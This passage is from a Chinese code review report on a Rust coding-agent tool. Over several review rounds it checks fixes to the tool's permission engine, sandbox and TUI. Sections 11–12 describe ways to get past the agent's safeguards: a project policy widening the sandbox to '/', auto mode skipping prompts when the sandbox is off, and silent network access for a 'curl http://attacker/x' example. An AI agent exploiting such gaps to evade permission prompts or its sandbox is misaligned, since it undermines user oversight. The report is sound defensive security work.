  回合照常跑完所有工具调用，进程以 0 退出，输出被静默截断。脚本侧无法区分
  「正常结束」与「下游已关闭」。
- 建议：捕获写结果，`Err` 时中止回合并让进程以非零退出。

**R8 侧栏拖拽状态在丢失 `Up` 事件后永久粘住（中低）**

- 证据：`envoy-cli/src/tui/mouse.rs:24-30`，`Down(Left)` 只在靠近分隔线时置
  `dragging_divider = true`，**落在别处时不复位**；唯一复位点是 `:58-59` 的
  `Up(Left)`。若 `Up` 丢失（在终端窗口外松开），或 `Up` 期间有 modal 打开，
  状态就一直为真。
- 影响：此后每次 `Drag` 都在拖分隔线（`:37-46` 直接 `return`），文本选区再也用不了，
  只能重启控制台。
- 建议：`Down` 分支在未命中分隔线时显式 `dragging_divider = false`；`Moved`
  且无按键时也复位。

**R9 `decode_hex` 按字节切片，非 ASCII 载荷会 panic（低，仅 macOS）**

- 证据：`envoy-cli/src/tui/clipboard.rs:198-205`，只检查 `hex.len() % 2 != 0`，
  然后 `&hex[i..i + 2]`。若 hex 串含多字节 UTF-8 字符且字节偏移为偶数，
  切片会切断字符边界 → panic。
- 边界：`#[cfg(target_os = "macos")]`，只在 `osascript` 返回的表单里出现非 ASCII 时触发。
- 建议：先 `if !hex.bytes().all(|b| b.is_ascii_hexdigit()) { return None; }`。

**H5 `agent.json` 缺键即启动失败，`max_jobs` 无上界（低）**

- 证据：`envoy-core/src/config.rs:11-21` 的 `AgentConfig` 三个字段都没有
  `#[serde(default)]`；`open()`（`:61-71`）用 `serde_json::from_str(&raw)?` 直接传播错误。
  手写 `{"enabled":true}` 会让 daemon 起不来。
- `max_jobs` 有一侧保护：`job.rs:161` `let max_jobs = max_jobs.max(1);`（下界被夹住），
  但**没有上界**，配置成百万级就是无界进程。
- 建议：加 `#[serde(default)]`；`max_jobs` 用 `clamp(1, 64)`。

**C13 `gate` 接受空的调用者标识（低）**

- 证据：`envoy-core/src/config.rs:137` `if cfg.allow.iter().any(|d| d == id)`，
  `:99-104` 的 `allow()` 对 `caller_id` 不做任何非空校验。
- 影响：allowlist 里存在 `""` 时，一个 `Caller::Remote("")` 即可通过；
  正常路径不会产生空 id，属纵深防御缺口。
- 建议：`allow()` 拒绝空串，`gate` 显式拒绝空 id。

**附带的鲁棒性观察（已核对计数，非缺陷）**：`envoy-agent/src/runtime/` 下
`lock().unwrap()` 共 **135 处**。任何一次持锁 panic 都会永久毒化该锁，
此后对该会话的每次操作都 panic。`PhaseGuard`/`InitGuard` 会吞掉 poison
（`hooks.rs:283`、`live.rs:44`），所以表现为「阶段卡死」而不是明确报错。
这不是单个 bug，是一类系统性风险，建议至少在 `Live` 上换成
`unwrap_or_else(|e| e.into_inner())` 或统一 poison 策略。

### 9.2 锁序复核结论

把 `runtime/` 下的加锁点全部走了一遍，**没有发现新的环**：已知的
`sessions -> Live`（`server.rs:641-646`、`super::ops:9-13`）之外，
叶子层只有 `Live -> steer` 与 `Live -> hook_state`，`monitors` 是
`inner -> local_socket`，两个方向都不存在反向获取。
`MonitorHub::stop` 在 `await` 前先丢锁（`runtime/monitors.rs:276-293`），
pump 在 `start_turn` 与写 checkpoint 前也先丢锁（`server.rs:358-364`）——这两处是对的。

### 9.3 被推翻的 8 条（第一轮盲区抽查里的过度断言）

| 候选结论 | 复核结果 | 依据 |
| --- | --- | --- |
| 远端保护清单漏 `.conduit`/`.gnupg`/`.kube` | 不成立 | `policy.rs:117-123` 另有一轮 `user_secret_paths()` 前缀判定，而 `sandbox/mod.rs:25` 的 `USER_SECRET_DIRS` 含这三项 |
| 远端 `Write` 可覆盖 `.git/config` | 不成立 | `canonical_with_tail`（`policy.rs:190-214`）会 canonicalize 已存在的祖先，软链目录会被解析；且 `.git` 在 `PROTECTED_COMPONENTS` 中。已有测试 `remote_path_blocks_symlinks_into_protected_dirs`（`policy.rs:262`）专门覆盖 |
| `max_jobs: 0` 会让所有 job 被拒 | 不成立 | `job.rs:161` `max_jobs.max(1)` 已夹住下界 |
| job 日志 `truncate(true)` 会让陈旧 offset 读到别人的字节 | 未成立 | `next_id` 以 `max_existing_log_id` 兜底（`job.rs:127-128`），id 不复用，同名文件不存在旧内容 |
| `write_atomic` 用 best-effort `set_mode` | 不成立 | `fs.rs:197-232` 的 `write_atomic_sync` 用 `create_new(true)` + `set_mode_strict`，失败即回滚删除 |
| PATH 里被投毒的 `bwrap` 就是全部边界 | 大幅削弱 | `bwrap.rs:17-21` 先查 `/usr/bin/bwrap`、`/bin/bwrap`，PATH 只是兜底 |
| 远端传 `HOME` 就能读受害者的 `~/.ssh` | 未成立 | 机制真实（`HOME` 不在 `is_dangerous_env_var` 里），但遮蔽路径由 daemon 侧真实 home 计算，改子进程 `HOME` 不改变挂载遮蔽；路径解析也走 daemon 的 `home_dir()` |
| side lane 在 abort 后永久卡在 running | 未成立 | `state.side = None` 时 `Drop for SideLane` 连同 `running` 字段一起析构；`finish_side` 在此之前先 `as_mut()` 判 `None` 直接返回（`side_watch.rs:124-126`） |

关于 side 这条留一个**残留风险**（推断，未构造出时序）：`finish_side` 写回
`side.messages`/`running` 时没有代际标记，如果旧任务与新 lane 的生命周期重叠，
会把旧结果写进新 lane。当前没找到稳定可达的交错，记为待观察，不建议现在改。

### 9.4 第二轮后的补充修复顺序

在上面第 8 节 1-7 步之间插入：**第 2 步之后加 C9**（`start_turn` 的 claim 失败必须返回，
这是唯一能产生「不可打断的并发回合」的路径），然后是 **C12 + S8**（审计与遮蔽都是 fail-open），
再是 **C10/C11 + R6/R7**。R8/R9、H5、C13 归入最后一批。

第二轮新增的 11 条里，只有 C9 属于「高」，其余以中等为主——这说明第一轮把高价值区域
（权限、协议、循环）已经覆盖得比较干净，剩下的是并发收尾与错误处理粒度的问题。

---

## 10. 第三轮：修复成果复核

针对反馈提到的「止血与加固批次」，本轮把第 1-9 节的每一条重新验证了一遍。
验证手段与前两轮一致：读源码 + `cargo test --workspace` + `cargo clippy` +
`cargo fmt --check` + `scripts/check-file-sizes.py`。

### 10.1 门禁状态：已全绿

| 项 | 第一轮 | 现在 | 状态 |
| --- | --- | --- | --- |
| `cargo test --workspace` | 439 通过 / 2 失败 | **445 通过 / 0 失败** | 已核对 |
| `cargo clippy --workspace --all-targets` | 7 条 warning | **0 条** | 已核对 |
| `cargo fmt --all -- --check` | 13 个文件未过 | **0 个** | 已核对 |
| `scripts/check-file-sizes.py` | exit 0（44 软限超标） | exit 0（43 软限超标） | 已核对 |

上一轮判定的「会挂 CI」两个红项已消除。净增 6 个测试，其中 5 个直接对应本轮修的缺陷。

### 10.2 已修复（16 项，逐条核对过代码或测试）

| 条目 | 修复方式 | 验证 |
| --- | --- | --- |
| S1 `extra_rw` 自我扩权 | 项目策略**不再**贡献 `extra_rw`；新增 `paths::sanitize_extra_rw` 对全部来源按 `is_protected` 过滤 | 测试 `project_policy_cannot_widen_extra_rw_and_protected_extra_rw_is_stripped` |
| S2 `stop()` 盲发 SIGTERM | 先 `UnixStream::connect` 探活，再核 `/proc/<pid>/cmdline` 的 argv0，成功后删 pid 文件 | `daemon.rs:389-460` |
| S3 受保护名大小写 | `has_component_in` 改 `eq_ignore_ascii_case` | 测试 `protected_components_match_case_insensitively` |
| S4 检查/使用两条路径 | 新增 `prepare_local_write_args`：重新解析后与授权时的 canonical 比对，不等则 `bail`，并把 canonical 传给写入 | `agent/tools/fs.rs:92-130` |
| S5 审计失败静默 | `record_decision` 返回 `Result`；`log_audit` 失败时发 `AgentEvent::Say` 警告到 UI | `permissions/mod.rs:528-540` |
| S8 bwrap 走查 fail-open | 超 `MAX_WALK_ENTRIES` 改为 `bail!` 拒绝执行 | `sandbox/bwrap.rs:278-283` |
| C1 `payload_len` 返回 0 | 改为 `Result<usize>`；三个调用方分别按「丢弃该项 / 走瘦身路径」处理 | `runtime/snapshot.rs:154`、`live.rs:188`、`server.rs:142` |
| C2 `SessionReset` 不投递 | 记录后对存活订阅者逐个 `try_send` | `runtime/server.rs:161-172` |
| C6 无编译期版本绑定 | 加 `const _: () = assert!(AGENT_PROTOCOL_VERSION as u8 == envoy_proto::AGENT_VERSION);` | `runtime/protocol.rs:17` |
| C9 丢弃 claim 结果（最高危） | `start_turn` 在 claim 失败时发 `TurnError` 并 return；`queue_plan_or_start` 改成「判定 + claim」同一次持锁 | `server.rs:230-236`、`side.rs:59-65` |
| C10 无 `Drop for Live` | 新增 `Drop` 里 abort `turn`/`pump` | `runtime/live.rs:101-110` |
| C11 监控析构丢取消 | 存下 `runtime_handle`，替代析构时 `try_current()` | `runtime/monitors.rs:51-57,128` |
| C12 审计轮转互删 | 进程内 `Mutex` 串行化 + 原子 `rename` 覆盖（去掉先 `remove`） | 测试 `concurrent_rotate_preserves_rotated_generation` |
| R6 conduit 读无超时 | 总预算 30s + 单次读 10s 的 `timeout` | `conduit/mod.rs:395-405` |
| R7 headless 吞写错误 | 写失败转为 `TurnFailure` 并中止回合 | `headless/output.rs:61-90` 等 |
| R8 拖拽状态粘住 | `Down` 开头无条件 `dragging_divider = false` | `tui/mouse.rs:22` |
| R9 `decode_hex` 切片 panic | 先校验全是 ASCII hex 数字 | `tui/clipboard.rs:200` |
| H5 `agent.json` 缺键/无上界 | `#[serde(default)]`；`max_jobs` 改 `clamp(1, 64)`（`open` 与 `set_max_jobs` 两处） | `config.rs:10`、`job.rs:75,161` |
| C13 空调用者 id | `allow()` 与 `gate()` 都拒空串 | 测试 `gate_and_allow_reject_empty_caller_id` |

C9 值得单独说一句：修复同时覆盖了「调用方已 claim」这一合法路径
（`(phase == RunningTurn && turn.is_none()) || claim(...)`），
没有把正常流程误判为忙。这条是这一批里价值最高的。

另有两项部分完成：

- **C7 阻塞 I/O**：`read_available` 已进 `spawn_blocking`（`crates/envoy-service/src/server.rs:370`）；
  `job.rs:497-502` 的 `persist` 仍在表锁内做 `snapshot`（含 `metadata`），未改。
- **H2 文档漂移**：`README` 已补 `envoy-agent`、`ARCHITECTURE.md` 删掉 `envoy-bridge`、
  `docs/architecture.md` 改成 `sandbox/`、`MANUAL-TEST.md` 的 `envoy ui` 改为裸 `envoy`
  且工具数 6→8。**仍有两处未动**：`crates/envoy-agent/tests/` 依旧为空目录；
  H1 的 24 处 `too_many_arguments` 与 43 个软限超标文件仍在。

### 10.3 延后项：与反馈一致，已核对确实未改

| 条目 | 现状 | 结论 |
| --- | --- | --- |
| C4 TUI 队列/`running` 权威化 | `tui/state/agent.rs:549` 仍本地 `queued.push_back` | 延后，改的是交互语义，同意单独立项 |
| R1 `<2KB` 工具输出折叠 | `mask.rs:11` 仍 `2_000` | 延后，改的是压缩行为，同意 |
| H3 `release.yml` ARM 门禁 | `.github/workflows/release.yml:28` 仍 `continue-on-error` | 延后，属发布流水线策略，同意 |

### 10.4 反馈两条说法的核对结果

**C8（`prune_at` 波段）——说法成立，但有一个措辞要澄清。** 反馈称
「跨过 `compact_at` 后会优先尝试 Stage 1（mask，`pruned_only = true`）再决定是否调摘要模型」，
这与 `context/mod.rs:195-215` 完全一致：先 `mask_old_observations`，
若 `after_mask <= compact_at` 且有回收就返回 `mask_outcome`，否则才走
`split_head_tail` + 摘要。我也同意「60%–85% 不触发是为保 prompt 前缀稳定」属于有意取舍。

**但「`prune_at` 是第一阶段触发线」这个理解并不成立**：
`loop.rs:216` 的门限仍是 `before_tokens > plan.compact_at`，而 `prune_at`
在 `context/mod.rs:191` 只作为「低于它就返回 `None`」的守卫存在。
由于 loop 只在 `> compact_at`（必 `> prune_at`）时才调用、溢出重试走 `force=true`
（跳过该守卫），**`prune_at` 在当前代码里没有任何触发作用**，
`skip_inplace_mask`（`mod.rs:320`）也仍是 `#[cfg(test)]`。
所以不是「两阶段各有触发线」，而是「两阶段都挂在 `compact_at` 这一条线上」。
建议保留实现，但把 `prune_at` 改名或注释清楚「latch 判定用，非触发线」，
否则下一个人读 `budget.rs:131` 的 `60%` 会再次得出和我相同的误解。

**R4（`STREAM_IDLE` 超时）——说法成立。** `loop.rs:280` 的
`call_provider_with_overflow_retry(...).await?` 在 `?` 处直接向上传播，
而所有 `messages.push(...)`（`:325`、`:346`、`:348`、`:405`、`:415`）都在它之后，且只在成功分支。
所以超时确实不会把半截回复写进历史，不污染后续回合。
我上一轮把它标为「推断」，现在改为**已核对**，并从待办中移除。

### 10.5 本轮复核的新发现（3 项）

**N1 `AGENTS.md` 与新放行语义冲突（文档，中）**

- 本轮给 `rules.rs` 新增了 3b 短路段（`rules.rs:277-294`）：`turbo` 恒放行、
  `auto` 在有强制沙箱时放行，条件是 `!ctx.protected_hit`，位置在 deny 规则与
  plan 门禁之后、受保护路径守卫与 ask 规则之前。
- 该行为**有测试也有文档**：`turbo_mode_never_prompts_but_deny_rules_still_win`
  明确断言 deny 仍胜、`.env` 仍 `ask`；ADR 005 加了「Amendment (2026-11-20)」，
  `docs/architecture.md:91` 也同步了。
- **但 `AGENTS.md` 没跟上**：`:73` 仍写 `deny > ask > allow`，`:77` 仍写
  `parse failure means ask`。而 3b 位于 ask 规则之前，因此
  「用户显式配置的 ask 规则」与「shell 解析失败」在 auto/turbo 下都会被直接放行
  （测试里 `echo 'unterminated` 在 turbo 下确实返回 Allow）。
- 影响有限（默认模式是 `Default`，auto/turbo 需手动循环切换），但 `AGENTS.md`
  是契约文件，现在它对这两个模式的描述是错的。
- 建议：在 `AGENTS.md` 的 Permissions 段补一句
  「`auto`（有强制沙箱时）与 `turbo` 在 deny 之后、ask/受保护守卫之前放行；
  ask 规则与已保存审批在这两个模式下不生效」。**不要**改代码——行为本身站得住。

**N2 我上一轮有一条结论需要更正（`daemon start`）**

- 上一轮我把 `docs/MANUAL-TEST.md` 里的 `$B daemon start` 判为「过期命令」。
- 复核发现 **`daemon` 子命令真实存在**：`crates/envoy-cli/src/cli_args.rs:39`
  有 `Daemon { cmd: DaemonCmd }`，`:119` 是 `DaemonCmd` 定义。
  所以 `$B daemon start` 不是文档漂移，是我误判。
- `MANUAL-TEST.md` 里真正过期的是已修掉的 `envoy ui` 与「6 个工具」。
  该更正已并入 10.2 的 H2 行。

**N3 一个偶发失败的集成测试（低，非本轮引入）**

- 全量并行跑 4 次，其中 1 次 `envoy-service/tests/conduit_control.rs:154` 失败：
  `assert!(text.contains("through-conduit"))` 拿到了空日志。
- 单跑该测试 3/3 通过，随后连续 3 次全量跑均 445 通过 0 失败。
  说明是负载下的时序抖动，不是回归。
- 从代码看，`finished == Some(0)` 已通过而正文为空，是「订阅日志早于子进程写出」
  的竞态窗口。建议在测试里对内容做短轮询，而不是一次断言。
- 结论：记为待修测试，不影响 10.1 的门禁判断（三次全量复跑均绿）。

### 10.6 复核后的结论

这一批修复的质量高于我的预期，原因有三：**每条都对着具体行号改**、
**高危项都补了回归测试**、**没有为了过 CI 而放宽检查**
（`clippy -D warnings` 是 0 条真修，不是加 `#[allow]` 糊过去）。

- 19 项里 16 项已修、2 项部分修（C7 的 `persist`、H2 的两个遗留）、3 项按声明延后。
- 唯一「未声明且未处理」的是 **C5**：`tui/mod.rs:109-112` 的 `paint()`
  第一行仍是 `inputs::sync(app)`，每帧做阻塞磁盘 I/O。它不在 C4/R1/H3 的延后名单里，
  建议并入 C4 那次交互改造（都在 TUI 状态层），或单独排期。
- 另一处可选收尾是 **C3**：只加了 `tracing::warn!`（`summary.rs:295-301`），
  压缩事件里仍无 `summary_source` 标注，UI 依然无法告诉用户「这轮摘要是降级拼接的」。
  从「中」降为「低」，但仍未闭环。

### 10.7 建议的下一步

1. `AGENTS.md` 补那两句（N1）——纯文档，但它是契约文件，成本最低、收益最高。
2. C5 并入 C4 的 TUI 交互改造一并做。
3. C3 加 `summary_source` 字段，顺手把 `prune_at` 的措辞理清（C8 残留）。
4. H1 的参数收敛与 43 个软限文件，作为独立的机械重构 PR。

---

## 11. 第四轮：二次修复复核

这一轮复核上一批「已修复」的成果，重点是三个遗留项（N1/C5/C8）是否真做了，
以及新改动有没有引入新缺陷。**结论：三个遗留项全部修好，门禁全绿；
但用对抗性视角复查后，发现上一批的 S1 修复不完整，且新增的 relaxed 短路带来两条安全副作用。**

### 11.1 门禁：全绿，且已消除抖动

| 项 | 结果 | 状态 |
| --- | --- | --- |
| `cargo test --workspace` | 445 通过 0 失败，**连跑 5 次全绿** | 已核对 |
| `cargo clippy --workspace --all-targets` | 0 条 warning | 已核对 |
| `cargo fmt --all -- --check` | 0 个文件 | 已核对 |
| `scripts/check-file-sizes.py` | exit 0（43 个软限超标） | 已核对 |

上一轮记录的 N3 偶发失败（`conduit_control.rs:154`）本轮 5 次全量复跑未再出现，
测试文件本身未改，仍按「负载相关抖动」记录，不再视为缺陷。

### 11.2 三个遗留项：已全部修复

| 条目 | 修复内容 | 验证 |
| --- | --- | --- |
| N1 `AGENTS.md` 与新语义冲突 | `:73-79` 补上「relaxed 模式在 deny 之后短路到 allow」「受保护路径在任何模式下仍 ask」「parse failure 的 ask 在短路之外」 | `git diff AGENTS.md` 逐句核对 |
| C5 渲染路径 I/O | `paint()` 降级为 `#[cfg(test)]` 测试专用；`paint_now` 改为直接 `view::draw`，不再 sync；`inputs::sync` 移到 `drive.rs:249` 的事件/定时路径 | `tui/mod.rs:109`、`drive.rs:154-157`、`drive.rs:249` |
| C8 `prune_at` 措辞 | `budget.rs:131` 加注释说明它是「非强制调用方下界守卫，不是 `loop.rs` 的触发线」；`context/mod.rs:191` 同步标注 | `git diff` 已核对 |

C5 的修法比我建议的更干净：不是把 `sync` 换个位置，而是让生产路径**根本不再经过**
`paint()`，测试仍可复用同一绘制入口。

### 11.3 仍未处理（4 项，均为已知且非安全）

| 条目 | 现状 | 严重度 |
| --- | --- | --- |
| C3 摘要降级不可见 | `summary.rs:295-301` 仍只有 `tracing::warn!`；`CompactionOutcome` 与 `AgentEvent::Compacted` 都没有 `summary_source` 字段 | 低 |
| C7 `persist` 持锁 | `job.rs:497-502` 仍在 `table` 锁内 `snapshot`（含 `metadata`） | 中低 |
| H2 `crates/envoy-agent/tests/` | 仍为空目录 | 低 |
| H1 尺寸纪律 | 24 处 `too_many_arguments`、43 个软限超标文件，与上一轮持平 | 中 |

### 11.4 本轮新发现：S1 的修复不完整（高）

上一轮我把 S1 记为「已修复」，本轮实测推翻了这个结论——**它只修了一半**。

- 现状：`permissions/paths.rs:74-91` 的 `sanitize_extra_rw` 只按 `is_protected` 过滤。
  而 `is_protected` 覆盖的是 `.git/.ssh/.env/.envoy/.aws/.codex/.agents` 等 basename、
  `/etc/{shadow,gshadow,sudoers}` 三个精确路径、以及 `user_secret_paths()` 的子目录。
- 实测（临时探针测试，已删除）：给 `sanitize_extra_rw` 传入下列值，**全部原样通过**：

  ```
  /etc          -> ["/etc"]
  /usr          -> ["/usr"]
  /bin          -> ["/usr/bin"]
  /home         -> ["/home"]
  /             -> ["/"]
  $HOME         -> ["/home/elysia"]
  ```

- 后果：项目仓库自带的 `.envoy/permissions.json` 写 `extra_rw: ["/"]` 或 `["/etc"]`
  仍会进入 `SandboxPolicy::WorkspaceWrite.extra_rw`（`permissions/mod.rs:258-265`），
  而 `bwrap.rs:172` 会把它 `--bind` 成可写。等于绕过了 S1 想堵的那条路，
  只是绕不到 `~/.ssh` 而已。
- 建议：`sanitize_extra_rw` 改成白名单——只接受工作区内路径；
  单文件授权需要显式确认；硬拒 `/`、`$HOME` 及其祖先、
  `/etc /usr /bin /sbin /lib* /boot /var /proc /sys`。
  这条应该优先于本轮其它所有项。

### 11.5 本轮新发现：relaxed 短路的三条副作用（中高）

3b 短路段本身有测试、有 ADR、有 `AGENTS.md` 说明（11.2 的 N1），
但对抗性复核暴露三个未覆盖的组合，**都与它「沙箱才是边界」的前提相冲突**。

**P1 relaxed 判定看宿主机后端，不看实际生效策略（中高）**

- `rules.rs:284` 的 `sandbox_backend_isolated()` 走 `capabilities()`（`sandbox/mod.rs:134`），
  只反映**宿主上有哪种后端可用**；而 `SandboxOverride`（`mod.rs:246`）在判定之后才生效。
- `envoy-cli/src/headless/mod.rs:174-175` 允许 `--sandbox off` 设置该 override。
- 组合：`envoy -p ... --permission-mode auto --sandbox off` 在有 bwrap 的机器上
  → `relaxed = true` → 短路 allow → `sandbox_for` 返回 `SandboxPolicy::Off` → **无沙箱且不提示**。
- 这与 `docs/architecture.md:91` 自己写的「auto only when the sandbox enforces
  the workspace boundary」直接矛盾。默认模式是 `Default`，但 `--sandbox off`
  正是用户最可能想「关掉沙箱但仍要提示」的场景。
- 建议：把 `sandbox_ovr` 传进 `evaluate_tool_call_with_mcp`，
  override 为 `Off`/`DangerFullAccess` 时 `relaxed = false`。

**P2 短路 allow 顺带授权出网（中高）**

- `make_decision`（`rules.rs:463-473`）原样复制 `ctx.needs_net`，
  `Effect::Allow` 分支把它传给 `sandbox_for(..., decision.needs_net, ...)`（`mod.rs:260-265`）。
- 于是 auto+bwrap 下 `curl http://attacker/x` → 短路 allow → `WorkspaceWrite{allow_net: true}`，
  **既不提示，也静默打开了网络**。
- 附带后果：`rules.rs:393-401` 的 `destructive` / `outside_workspace` / `needs_net`
  三条 ask 在 relaxed 模式成为不可达死代码。
- 建议：relaxed 短路分支把 `needs_net` 强制为 `false`，或在短路前保留
  `needs_net`/`destructive` 的 ask。**模式放宽不应该顺带授权网络。**

**P3 `job`/`monitor` 从不计算 `protected_hit`（中）**

- `permissions/match_rule.rs` 的 `InspectContext::build` 只对
  `write|edit|read|ls|glob|grep`、`webfetch`、`exec`、`mcp__*` 建上下文，
  `job` 与 `monitor` 落到末尾的 `_ => {}`，`protected_hit` 恒为 `false`。
- `rules.rs:296-303` 的受保护路径守卫名单里也只有那六种工具。
- 后果：`job {"action":"start","command":"... > .env"}`、`monitor` 自带 `command`
  在 auto 下不触发受保护路径的 ask。单独看影响有限（`monitor` 的 `command`
  会转投 `exec` 走一遍权限，这点上一轮已验证），但与 P1/P2 叠加就构成完整逃逸链。
- 建议：`job`/`monitor` 复用 `analyze_shell` 填 `protected_hit`，
  把守卫改成「任何带 `command`/`cwd`/`path` 参数的工具」。

### 11.6 本轮新发现：其余 6 条（已核对，中低）

| 编号 | 问题 | 位置 |
| --- | --- | --- |
| Q1 | 审计轮转与追加不在同一把锁内：先 rename 释放锁，再在锁外 open+write。持旧 fd 的写者会把行写进已改名为 `.1` 的文件，下次轮转又被覆盖 | `audit.rs:33-42`（`rotate_if_oversized` 与 `audit()` 之间） |
| Q2 | `write` 的 TOCTOU 只做了一半：`expected_canonical` 确实从 `auth.resolved_path` 穿到了 `write_tool`（`tools/mod.rs:169`），不是死代码；但比较完仍按路径重新 `open`，没有 `O_NOFOLLOW`/dirfd，比较与打开之间换符号链接仍可重定向 | `agent/tools/fs.rs:92-130` |
| Q3 | 子代理 lane 文本达 `TEXT_CAP`（6000）后 `append_text` 直接 `return`，后续文本**永久丢弃**，不会另起一条 | `tui/state/subagent.rs:188-192` |
| Q4 | `flush_text` 先 `mem::take` 清空缓冲再 `cap_text(4000)` 截断，单次超 4000 字的分片尾部永久丢失 | `runner/forward.rs:234-243` |
| Q5 | `subagents: BTreeMap<String, Vec<SubagentLane>>` 只有 `entry().or_default()` 插入，全仓无移除路径，长会话下会话 JSON 无界增长 | `tui/state/subagent.rs:92` |
| Q6 | 剪贴板探测命令无超时、未设 `Stdio::null()`，剪贴板持有者挂住时会阻塞调用方 | `tui/clipboard.rs` 三个 `try_*_image` |

Q1–Q6 均为已核对代码形状，未构造复现。另有四条子代理提出但我**未核对**、因此不作结论：`delegate.rs` 的宽度预算少算 2 格、
`side_view` 长输入时光标不跟随、`agent_view` 丢弃 `Notice` 项、
`finish_side` 在 lane 已消失时不发 `Done`。

### 11.7 结论

- 三个遗留项（N1/C5/C8）**全部修好**，且 C5 的修法优于我的建议；
  门禁 445 测试连跑 5 次全绿、clippy 0、fmt 0、尺寸 exit 0。
- 但上一轮我判为「已修复」的 **S1 只修了一半**：受保护目录挡住了，
  `/`、`$HOME`、`/etc`、`/usr` 仍然畅通。这条我上轮漏判，本轮纠正。
- 新增 3b 短路本身设计成立，但**判定依据错了**（看后端可用性而非实际策略），
  且**放行时把网络权限一并带出去了**。这两条是本轮最值得优先处理的。
- 结论从上一轮的「可以收工」修正为：**S1 补完 + P1/P2 修掉之后**才建议收工，
  P3 与 Q1–Q6 可以排在后面。

### 11.8 建议的下一步（按优先级）

1. `sanitize_extra_rw` 改成白名单（11.4）——唯一的「项目策略可放大到根」通道。
2. P1：把 `sandbox_override` 纳入 relaxed 判定。
3. P2：relaxed 短路把 `needs_net` 钉成 `false`。
4. P3：`job`/`monitor` 计算 `protected_hit`。
5. Q1–Q6 作为一批小修；C3/C7/H1/H2 按原计划。

---

## 12. 第五轮：三次修复复核

针对第 11 节列出的 S1/P1/P2/P3 与 Q1–Q6 再查一遍。**结论：S1/P1/P2、Q1/Q3/Q5/Q6 已修且实测通过；
Q2/Q4 仍未修；P3 经复核不成立（上轮我判错）；另发现一个孤儿测试文件与一处策略不一致。**

### 12.1 门禁：全绿

| 项 | 上轮 | 现在 | 状态 |
| --- | --- | --- | --- |
| `cargo test --workspace` | 445 通过 | **454 通过 0 失败**（净增 9） | 已核对 |
| `cargo clippy --workspace --all-targets` | 0 条 | 0 条 | 已核对 |
| `cargo fmt --all -- --check` | 0 个 | 0 个 | 已核对 |
| `scripts/check-file-sizes.py` | exit 0（43 软限） | exit 0（**45** 软限） | 已核对 |

软限超标从 43 涨到 45，属新增模块的自然增长，未触发硬限。

### 12.2 已修复并实测通过（8 项）

**S1 `extra_rw` 放大到根目录（上轮我判它「只修一半」）——本轮已实质修复。**

- 现状：`paths.rs:75-95` 在 `is_protected` 之外新增 `is_unsafe_extra_rw_root`，
  硬拒 `/`、`$HOME` 及其祖先、`user_secret_paths()` 的祖先，外加一张
  `BLOCKED_TREES`（`/etc`、`/usr`、`/bin`、`/sbin`、`/lib*`、`/boot`、`/proc`、`/sys`、
  `/dev`、`/root`、`/run`、`/System`、`/Library`、`/var/{lib,log,run,spool,cache,db,mail,backups,root,empty}`
  及其 `/private` 变体）。
- 我重新用探针实测（已删除），结果与上轮对照：

  ```
  /etc        -> []                     (上轮: ["/etc"])
  /usr        -> []                     (上轮: ["/usr"])
  /           -> []                     (上轮: ["/"])
  /home       -> []                     (上轮: ["/home"])
  $HOME       -> []                     (上轮: ["/home/elysia"])
  /tmp        -> ["/tmp"]               (保留)
  /var/tmp    -> ["/var/tmp"]           (保留)
  $HOME/proj  -> ["/home/elysia/proj"]  (保留，工作区子目录正常放行)
  ```
- 残留（见 12.5 的 R-A）：黑名单式设计，`/opt`、`/srv`、`/data`、其他用户家目录
  `/home/x/y` 仍然通过。

**P1 relaxed 判定看后端而非实际策略——已修。** 新增
`PermissionEngine::sandbox_enforces_workspace()`（`permissions/mod.rs:198-210`），
把三件事合进判定：远程 target 直接 false、`SandboxOverride::Off|DangerFullAccess` 直接 false、
其余才看 `capabilities()`。经 `EvalOptions.sandbox_enforces_workspace`（`rules.rs:206`）
传入 `evaluate_tool_call_with_options`。`--permission-mode auto --sandbox off` 不再短路。

**P2 短路顺带授权出网——对 `exec` 已修。** 新增 `permissions/net_allowlist.rs`
（GitHub/Cargo/npm/PyPI/Go 的内置域名白名单），`InspectContext.net_allowlisted`
（`match_rule.rs:25`）记录判定结果；`rules.rs:300-307` 的
`auto_unallowlisted_net` 把「auto + exec + needs_net + 非白名单」排除在短路之外。
探针实测：auto 下 `curl http://attacker.example/x` → `Ask`（正确）。

**Q1 审计轮转与追加不在同一锁——已修。** 新增 `audit.rs:39-50` 的
`append_line_with_rotate`，把 metadata 检查、rotate、open+write 全部放进
`rotate_lock` 临界区；`audit()`（`:53-72`）改为只调它。并有并发测试
`append_line_with_rotate_serializes_concurrent_writers`（`:138`）验证
current 与 `.1` 两个文件里都是完整 JSON 行。

**Q3 子代理文本达上限后永久丢弃——已修。** `tui/state/subagent.rs:194-206`：
槽位满时先 `*done = true` 再落到 `push_capped` 另起一条，不再 `return` 丢弃。

**Q5 子代理映射无界增长——已修。** `subagent.rs:94-103` 引入 `MAX_SUBAGENT_GROUPS`，
超限时优先淘汰「全部 lane 非 Running」的组，否则淘汰最旧一组。

**Q6 剪贴板探测阻塞——已修。** `clipboard.rs:14` 新增 `run_cmd_timeout`，
统一 `.stdin(Stdio::null())` + 带截止时间的轮询，全部调用点改走它；
并有测试 `run_cmd_timeout_kills_hanging_process`（`:304`）。

### 12.3 仍未修复（4 项）

| 条目 | 现状 | 严重度 |
| --- | --- | --- |
| Q2 `write` TOCTOU | `agent/tools/fs.rs` 仍只有「比较 canonical 后按路径重新 open」，写入路径无 `O_NOFOLLOW`/`openat`/`fstat` 复验（全仓 grep 仅 `fs.rs:78` 一处 `symlink_metadata`，且属读路径） | 中 |
| Q4 `flush_text` 丢尾 | `runner/forward.rs:233-245` 仍是 `mem::take` 后 `cap_text(&text, 4000)`，单次超 4000 字的分片尾部永久丢失 | 中低 |
| C3 摘要降级不可见 | 全仓无 `summary_source` 字段，`CompactionOutcome` 与 `AgentEvent::Compacted` 均未带来源标记 | 低 |
| C7 `persist` 持锁 | `job.rs:497-502` 仍在 `table` 锁内 `snapshot`（含 `metadata`） | 中低 |

另 H1/H2 与上轮持平：24 处 `too_many_arguments`、`crates/envoy-agent/tests/` 仍为空目录。

### 12.4 P3 复核结论：上轮我判错，P3 不成立

第 11 节我写「`job`/`monitor` 从不计算 `protected_hit`，可构造
`job {"action":"start","command":"... > .env"}` 逃逸」。本轮逐层核对后**推翻**：

- `match_rule.rs` 确实没有 `job`/`monitor` 分支（`:168` 仍是 `_ => {}`），
  `protected_hit` 对它们恒为 false——这半句是对的。
- 但 **`job` 工具根本没有 `start` 动作**：`job_tool`（`tools/shell.rs:101-180`）的
  match 只有 `list`/`status`/`logs`/`wait`/`cancel`，没有任何分支能新建命令，
